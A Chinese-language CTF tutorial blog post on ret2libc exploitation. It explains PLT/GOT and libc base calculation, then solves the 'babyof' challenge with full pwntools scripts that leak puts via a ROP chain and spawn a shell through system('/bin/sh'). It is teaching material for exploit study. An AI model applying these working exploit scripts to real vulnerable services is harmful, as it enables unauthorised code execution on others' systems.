---
title: pwn-ret2libc
description: pwn-ret2libc的基础知识。
date: 2026-05-17 01:06:11
updated: 2026-05-17 01:06:11
image: https://images.cnblogs.com/cnblogs_com/blogs/860797/galleries/2492655/o_260123142048_9f05b8ba428e596429adcd9d49e4c980626510519.jpg
categories: [安全]
tags: [pwn]
---

# PWN-Ret2libc

## 基本概念

> libc 是 Linux 系统中遵循 ANSI C 标准的 C 语言函数库，提供文件操作、内存管理、字符串处理等基础功能，并封装系统调用以便应用程序使用。

---

## Ret2libc 与 ROP 链的终点

现代二进制程序普遍开启了 NX（不可执行）保护，导致传统的“栈溢出直接执行 Shellcode”失效。此时，Glibc 中丰富的代码片段成为了现成的利用跳板。

- 攻击者通常的第一步是泄露运行时的 **libc 基址**（因为 ASLR 的存在，每次加载地址不同）。
- 通过计算偏移，在 Glibc 中精准定位 `system` 函数以及 `/bin/sh` 字符串的真实地址。
- 利用栈溢出劫持 RIP/EIP，将执行流导向 Glibc，从而巧妙绕过 NX 保护拿下 Shell（即经典的 Ret2libc 攻击）。

---

## PLT表和GOT表

在进行ret2libc学习之前，我们需要先了解一下PLT表与GOT表的内容。

Globle offset table（GOT)全局偏移量表，位于数据段，是一个每个条目是8字节地址的数组，用来存储外部函数在内存的确切地址

```
puts@got 在 0x601018:   ← 这里存着 puts 在 libc 里的地址
                        ← 第一次调用前：指向解析器
                        ← 第一次调用后：0x7fXXXXXXXXXX
```



Procedure linkage table（PLT)过程连接表，位于代码段，是一个每个条目是16字节内容的数组，使得代码能够方便的访问共享的函数或者变量,地址固定

```
puts@plt 在 0x400520:  jmp  *[puts@got]    ; 跳转到 GOT 记录的位置
```

|              | PLT            | GOT                |
| ------------ | -------------- | ------------------ |
| 位置         | 代码段（.plt） | 数据段（.got.plt） |
| 内容         | 跳转指令       | 函数真实地址       |
| 类比         | 电灯开关       | 开关连到哪个灯泡   |
| 你能否控制？ | 不能直接写     | 可以读（泄露）     |

关于GOT与PLT的详细内容可以看[这个视频](https://www.bilibili.com/video/BV1a7411p7zK?spm_id_from=333.999.0.0)学习，这里只进行简要介绍

简单来说，当程序第一次执行函数A时，流程如下：

![img](https://i-blog.csdnimg.cn/blog_migrate/75d720d29003b16fa2b3872f760c6fa4.png){unoptimized=true}





在汇编程序调用函数A时，会先找到函数A对应的PLT表，PLT表中第一行指令则是找到函数A对应的GOT表。此时由于是程序第一次调用A，GOT表还未更新，会先去公共PLT进行一番操作查找函数A的位置，找到A的位置后再更新A的GOT表，并调用函数A。

![img](https://i-blog.csdnimg.cn/blog_migrate/694af6bfcf4b5036c116b65a84ccce7c.png){unoptimized=true}



当程序第二次执行函数A时，流程如下![请添加图片描述](https://i-blog.csdnimg.cn/blog_migrate/694af6bfcf4b5036c116b65a84ccce7c.png){unoptimized=true}
可以看到此时A的GOT表已经更新，可以直接在GOT表中找到其在内存中的位置并直接调用?



动态链接的程序（调用了 libc 的函数）需要知道函数在内存中的实际地址。但由于 ASLR，这个地址每次运行不同。



---

## 解题思路

我们的目标是拿到shell ，换言之就是，劫持二进制可执行文件的执行流程，让程序执行system("/bin/sh")。拆分这个目标，可以分为以下两个步骤：

> 1.找到system()函数和/bin/sh字符串在libc中的地址。2.劫持程序的执行流程，让程序执行system("/bin/sh")。



  实现第二步不难，只要精巧合理地构造溢出，把main函数的返回地址覆盖为system()函数的地址，并合理实现传参即可。关键在于如何找到system()函数和"/bin/sh"字符串的地址。这两个关键地址都在libc库中，这就是这类题型被叫做ret2libc的原因。那么如何寻找libc中的system()函数和"/bin/sh"字符串呢？这里需要用到以下公式：

> 函数的真实地址   =   基地址   +   偏移地址 

  要牢牢记住我们的目标：找到system()函数和"/bin/sh"字符串的真实地址。下面我们对这个公式做一个解释：

> 偏移地址：libc是Linux新系统下的C函数库，其中就会有system()函数、"/bin/sh"字符串，而libc库中存放的就是这些函数的偏移地址。换句话说，只要确定了libc库的版本，就可以确定其中system()函数、"/bin/sh"字符串的偏移地址。解题核心在于如何确定libc版本，本文介绍过程将忽略这个问题，打本地直接确定为本地的libc版本即可。
>
> 基地址：每次运行程序加载函数时，函数的基地址都会发生改变。这是一种地址随机化的保护机制，导致函数的真实地址每次运行都是不一样的。然而，哪怕每次运行时函数的真实地址一直在变，最后三位确始终相同。可以根据这最后三位是什么确定这个函数的偏移地址，从而反向推断出libc的版本（此处需要用到工具LibcSearcher库，本文忽略这个步骤）。那么如何求基地址呢？如果我们可以知道一个函数的真实地址，
>
> 用公式：这次运行程序的基地址 = 这次运行得到的某个函数func的真实地址  - 函数func的偏移地址
>
> 即可求出这次运行的基地址。 

 这回问题又发生了转化：如何找到某个函数func的真实地址呢？

> 像puts(),write()这样的函数可以打印内容，我们可以直接利用这些打印函数，打印出某个函数的真实地址（即got表中存放的地址）。某个函数又指哪个函数呢？由于Linux的延迟绑定机制，我们必须选择一个main函数中已经执行过的函数（这样才能保证该函数在got表的地址可以被找到），选哪个都可以，当然也可以直接选puts和write，毕竟题目中像puts和write往往会直接出现在main函数中。

总结一下上面这段话，我们可以通过构造payload让程序执行puts(puts@got)或者write(1,write@got, 读取的字节数)打印puts函数/write函数的真实地址。

整体思路总结（关键）：

> 1.首先寻找一个函数的真实地址，以puts为例。构造合理的payload1，劫持程序的执行流程，使得程序执行puts(puts@got)打印得到puts函数的真实地址，并重新回到main函数开始的位置。
>
> 2.找到puts函数的真实地址后，根据其最后三位，可以判断出libc库的版本（本文忽略）。
>
> 3.根据libc库的版本可以很容易的确定puts函数的偏移地址。
>
> 4.计算基地址。基地址 = puts函数的真实地址 - puts函数的偏移地址。
>
> 5.根据libc函数的版本，很容易确定system函数和"/bin/sh"字符串在libc库中的偏移地址。 
>
> 6.根据 真实地址 = 基地址 + 偏移地址 计算出system函数和"/bin/sh"字符串的真实地址。
>
> 7.再次构造合理的payload2，劫持程序的执行流程，劫持到system("/bin/sh")的真实地址，从而拿到shell。

----

## 知识点动画

[HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2libc/pwn_ret2libc.html · 工程部Teddy Bear/网络安全 - 码云 - 开源中国](https://gitee.com/ASUS_HACKED/cybersecurity/blob/比赛附件/HACKED笔记pwn/动画链接/NSSCTF-PWN/栈/ret2libc/pwn_ret2libc.html)

---

# [2021 鹤城杯]babyof

题目链接:
https://www.nssctf.cn/problem/469



```
checksec --file=babyof
```

| 保护       | 含义                                     | 本程序    | 对攻击的影响                          |
| ---------- | ---------------------------------------- | --------- | ------------------------------------- |
| **Canary** | 栈上放一个随机值，函数返回前检查是否被改 | ❌ 没有    | 可以随意覆盖返回地址                  |
| **NX**     | 栈不可执行                               | ✅ 开启    | 不能写 shellcode，必须 ROP            |
| **PIE**    | 代码地址随机化                           | ❌ 没有    | 代码段地址固定，gadget 地址可直接写死 |
| **RELRO**  | GOT 表保护                               | ⚠️ Partial | GOT 可读，能泄露 libc 地址            |

---

## pwntools 基础速查

| 代码                   | 作用                              |
| ---------------------- | --------------------------------- |
| `ELF('./babyof')`      | 加载 ELF 文件，分析符号、PLT、GOT |
| `elf.plt['puts']`      | 获取 puts@plt 地址                |
| `elf.got['puts']`      | 获取 puts@got 地址                |
| `p64(0x400743)`        | 把 64 位整数转成 8 字节小端       |
| `u64(data)`            | 把 8 字节小端转成 64 位整数       |
| `process('./babyof')`  | 启动本地进程                      |
| `remote('ip', port)`   | 连接远程                          |
| `r.recvline()`         | 收一行                            |
| `r.sendline(data)`     | 发一行（+换行）                   |
| `r.interactive()`      | 进入交互模式，可以敲命令          |
| `ROPgadget --binary X` | 搜索 gadget（命令行工具）         |

## 0x01 检查保护

```bash
checksec --file=babyof
```


![image-20260514094601448](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152552779-927052389.png)

main
![image-20260514094747455](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152552364-435279646.png)

sub_400632
![image-20260514094804460](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152551912-1656661937.png)

函数结构简单，sub_400632函数出现了read读出栈溢出漏洞



**漏洞：** 栈空间只有 64 字节，但 `read` 读了 256 字节 → **缓冲区溢出**。

string下未发现`system`，`bin/sh`参数

![image-20260514094928243](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152551505-2117563153.png)

NX开启，栈上内容无法当代码运行，那么就考虑libc方向。

Libc的解题就是先找一个函数基地址，计算libc基址，再进行system偏移(Libc存在system函数方法)

---

## 0x02 offset计算

函数栈布局：

```
        +----------------+
rbp+0x8 |  返回地址       │  ← 我们要覆盖这里
rbp     |  saved rbp      │  ← 8 字节
rbp-0x40|  buffer[64]     │  ← 从这里开始写
        +----------------+
```

从 buffer 到返回地址的距离 = `0x40` + `8`(saved rbp) = `72` 字节。



更快的方法就是使用cyclic 生成随机字符串,对程序进行破坏，用gdb进行检查程序ret错误地址的指向

![image-20260514100405313](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152551161-2011555038.png)



![	](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152550495-638900665.png)

复制rsp前8字节

saaataaa

再利用cyclic查表,

```bash
cyclic -l saaataaa
```



![image-20260514104554746](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152948422-1653021008.png)

offset = 72

---

## 0x03 攻击思路

程序只有 3 个 PLT 函数：`puts`、`read`、`setvbuf`。

没有 `system`，没有 `/bin/sh`，所以分两步：

### 第 1 步：泄露 libc 地址

```lua
puts(puts@got)  → 打印出 puts 在 libc 中的真实地址
                → 算出 libc 基址
                → 算出 system 和 /bin/sh
```

### 第 2 步：ROP 调用 system

```bash
system("/bin/sh")  → 拿 shell
```

---

## 0x04 需要的地址

### 程序内地址（无 PIE，地址固定）

| 什么           | 地址       | 怎么找                                        |
| -------------- | ---------- | --------------------------------------------- |
| `puts@plt`     | `0x400520` | `elf.plt['puts']`                             |
| `puts@got`     | `0x601018` | `elf.got['puts']`                             |
| 漏洞函数       | `0x400632` | objdump 看入口                                |
| `pop rdi; ret` | `0x400743` | `ROPgadget --binary babyof \| grep "pop rdi"` |
| `ret`          | `0x40066a` | `ROPgadget --binary babyof \| grep ": ret$"`  |

### ibc 内地址（需要泄露后计算）

| 什么      | 怎么算                              |
| --------- | ----------------------------------- |
| libc 基址 | `leak - libc.symbols['puts']`       |
| `system`  | `libc.symbols['system']`            |
| `/bin/sh` | `next(libc.search(b'/bin/sh\x00'))` |



pop_rdi_addr = 0x0400743

![image-20260514110810551](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152948032-1301476799.png)

---

## 0x05 ROP 链图解

### 第 1 轮：泄露

```python
payload = "a"*72 + pop_rdi + puts_got + puts_plt + vuln_addr

          72字节填充   ↑ 参数     ↑ 打印     ↑ 返回来再溢出一次
                       puts_got   puts_plt   vuln_addr
                       放进 rdi   执行 puts
```

执行流程：

> 发送 payload
>   ↓
> 程序 puts("I hope you win")
>   ↓
> ret → pop rdi; ret
>   → rdi = puts_got (0x601018)
>   → ret 到 puts_plt
>   → puts(0x601018) 打印出 GOT 表里的 puts 地址
>   → ret 到 vuln_addr (0x400632)
>   → 又打印 "Do you know..."，等你第二次输入



由于是libc题目，我们先在本地跑成功脚本之后再去远程测试服务器版本

先查查本机libc版本

```bash
ldd babyof
```

![image-20260514132340537](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152947659-2072343628.png)

### payload 1泄漏构造

```python
from pwn import *

context(os='linux',arch = 'amd64',log_level = 'debug')

r = process('./babyof')
elf = ELF('./babyof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#part1
r.recvline()
offset = 72
pop_rdi = 0x0400743
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vuln_addr = 0x0400632
payload_1 = b'a'*offset+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)

r.sendline(payload_1)

r.recvline()
leak = r.recvline().strip()
leak = u64(leak.ljust(8,b'\x00'))
print("puts addr ->",hex(leak))



r.interactive()
```

![image-20260514132719414](https://img2024.cnblogs.com/blog/3726946/202605/3726946-20260514152947071-1574725207.png)

可以看到puts的真实地址被我们映射出来了。

那么可以还原libc基址了

### payload 2泄露构造

```python
from pwn import *

context(os='linux',arch = 'amd64',log_level = 'debug')

r = process('./babyof')
elf = ELF('./babyof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#part1
r.recvline()
offset = 72
pop_rdi = 0x0400743
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vuln_addr = 0x0400632
payload_1 = b'a'*offset+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)

r.sendline(payload_1)

r.recvline()
leak = r.recvline().strip()
leak = u64(leak.ljust(8,b'\x00'))
print("puts addr ->",hex(leak))

#part2
libc.address = leak - libc.symbols['puts']

system = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh\x00'))
ret = 0x040066A
print("libc base addr -> ",hex(libc.address))
print("system addr -> ",hex(system))
print("bin_sh ->",hex(bin_sh))

payload_2 = b'a'*offset
payload_2 += p64(ret)
payload_2 += p64(pop_rdi)
payload_2 += p64(bin_sh)
payload_2 += p64(system)

r.sendline(payload_2)
r.interactive()
```

**函数解释**

```python
libc.address = leak - libc.symbols['puts']
```

  计算 libc 基址。

  - leak = 我们泄露出来的 puts 在内存中的真实地址（如 0x7f12345678xx）
  - libc.symbols['puts'] = puts 在 libc 文件中的固定偏移（比如 0x809c0）
  - 真实地址 - 偏移 = 基址

  例:  0x7f12345678xx - 0x809c0 = 0x7f1234560000  ← libc 基址

  libc.address = XXX 是 pwntools 的赋值语法，设置后后续所有 libc.symbols['xxx'] 都会自动加上这个基址。



```python
system = libc.symbols['system']
```

  获取 system 函数的内存地址。

  因为上一步已经设置了 libc.address，这里等价于：

  system = libc_base_addr + 0x4f440   # system 在 libc 中的偏移



```python
 bin_sh = next(libc.search(b'/bin/sh\x00'))
```

 libc.search(b'/bin/sh\x00') 返回一个生成器，遍历 libc 所有包含 /bin/sh 的位置。next() 取第一个匹配的地址。

为什么 libc 里有 `/bin/sh`？——因为 system 函数内部会用到 /bin/sh，这个字符串天然就存在于 libc的数据段中，攻击者直接借用就行。



---

## 0x06 常见问题 FAQ

### Q1：PLT 和 GOT 有什么区别？

|      | PLT            | GOT                        |
| ---- | -------------- | -------------------------- |
| 本质 | 跳板/入口      | 记录真实地址               |
| 比喻 | 门牌号（固定） | 里面住着谁（运行时才确定） |

### Q2：为什么要返回到 vuln_addr 再打一轮？

一次溢出只能做一个 ROP 链。需要：

- 第一次：泄露地址
- 第二次：拿 shell

所以第一次结束要回到漏洞函数，获取第二次输入机会。

---



### Q3：远程怎么确定 libc 版本？

1. 先用 exp 打远程，泄露 puts 的地址
2. 看地址最后 3 位（如 `0xaa0`）
3. 去 https://libc.rip 搜 `puts` / `0xaa0`
4. 下载匹配的 libc 文件

如果多个结果匹配，可以**同时泄露 puts 和 read 两个地址**，用组合偏移唯一确定

---



### Q4：ret 对齐是做什么的？

x86-64 的 system 函数内部有 `movaps` 指令，要求栈 16 字节对齐。不加 `ret` 多弹 8 字节 → 栈不对齐 → 段错误。

---

```md wrap
pwn-ret2libc基础知识点，包含题目
```
